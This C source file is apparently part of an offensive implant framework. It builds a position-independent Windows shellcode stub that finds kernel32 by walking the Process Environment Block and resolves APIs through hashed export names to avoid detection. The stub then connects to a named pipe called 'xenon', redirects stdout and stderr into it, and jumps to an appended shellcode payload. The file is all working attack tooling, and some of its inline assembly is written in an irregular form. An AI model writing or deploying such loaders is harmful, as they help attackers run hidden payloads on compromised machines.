#include <windows.h>
#include "structs.h"


/* Default pipe name */
#ifndef PIPENAME
#define PIPENAME "xenon"
#endif


typedef struct _Api {
    HANDLE (WINAPI *CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
    BOOL (WINAPI *SetStdHandle)(DWORD, HANDLE);
} Api;

DWORD HashStringA(const char* str) {
    DWORD hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + *str;         // hash * 33 + c
        str++;
    }
    return hash;
}
DWORD HashStringW(const wchar_t* str) {
    DWORD hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + *str;
        str++;
    }
    return hash;
}

FARPROC GetProcAddressByHash(HMODULE hModule, DWORD functionHash) {
    BYTE* base = (BYTE*)hModule;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    if (!exportDir.VirtualAddress)
        return NULL;

    IMAGE_EXPORT_DIRECTORY* exports = (IMAGE_EXPORT_DIRECTORY*)(base + exportDir.VirtualAddress);
    DWORD* names = (DWORD*)(base + exports->AddressOfNames);
    WORD* ordinals = (WORD*)(base + exports->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)(base + exports->AddressOfFunctions);

    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        const char* name = (const char*)(base + names[i]);
        if (HashStringA(name) == functionHash) {
            WORD ord = ordinals[i];
            return (FARPROC)(base + funcs[ord]);
        }
    }

    return NULL;
}

BOOL ResolveApis(Api* api) {
    if (!api) return FALSE;

/* String hashes */
#define KERNEL32_HASH           0x6DDB9555          // wchar
#define CreateFileA_HASH        0xEB96C5FA          // ansi
#define SetStdHandle_HASH       0x3CE0E4C8          // ansi

#if defined(_M_X64)
    PPEB peb = (PPEB)__readgsqword(0x60);
#elif defined(_M_IX86)
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    // PPEB peb = GetPEB();
    LIST_ENTRY* head = &peb->Ldr->InLoadOrderModuleList;
    LIST_ENTRY* curr = head->Flink;
    HMODULE kernel32Base = NULL;

    /* Find KERNEL32.DLL in the Process Environment Block */
    while (curr != head) {
        PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)curr;
        if (HashStringW(entry->BaseDllName.Buffer) == KERNEL32_HASH) {
            kernel32Base = (HMODULE)entry->DllBase;
            break;
        }
        curr = curr->Flink;
    }

    if (!kernel32Base) return FALSE;

    api->CreateFileA = (HANDLE (WINAPI *)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))GetProcAddressByHash(kernel32Base, CreateFileA_HASH);
    api->SetStdHandle = (BOOL (WINAPI *)(DWORD, HANDLE))GetProcAddressByHash(kernel32Base, SetStdHandle_HASH);

    if (api->CreateFileA == NULL || api->SetStdHandle == NULL)
        return FALSE;
    
    return TRUE;
}

/* For 64 bit shellcodes we will set this as the entrypoint */
void AlignRSP()
{
    asm("push %rsi\n"
        "mov % rsp, % rsi\n"
        "and $0x0FFFFFFFFFFFFFFF0, % rsp\n"
        "sub $0x020, % rsp\n"
        "call Start\n"
        "mov % rsi, % rsp\n"
        "pop % rsi\n"
        "ret\n");
}


void Start() {

    Api WinApi = { 0 };

    if (!ResolveApis(&WinApi)) {
        return;
    }

    
    /* Reserve max length (256) */
    const char sPipeName[256] = "\\\\.\\pipe\\"PIPENAME;

    // Connect to named pipe
    HANDLE hPipe = WinApi.CreateFileA(
        sPipeName,
        GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (hPipe != INVALID_HANDLE_VALUE) {
        /* Redirect stdout and stderr to the pipe */
        WinApi.SetStdHandle(STD_OUTPUT_HANDLE, hPipe);
        WinApi.SetStdHandle(STD_ERROR_HANDLE, hPipe);
    }


    /* Jump to the next shellcode */
    void* next = (void*)((uintptr_t)&AlignRSP + 0xBBBBBBBB);        // Placeholder for size of shellcode
    // void* next = (void*)((uintptr_t)&AlignRSP + 0x00000280);     // Length of this stub is 640 bytes

    ((void(*)())next)();
}


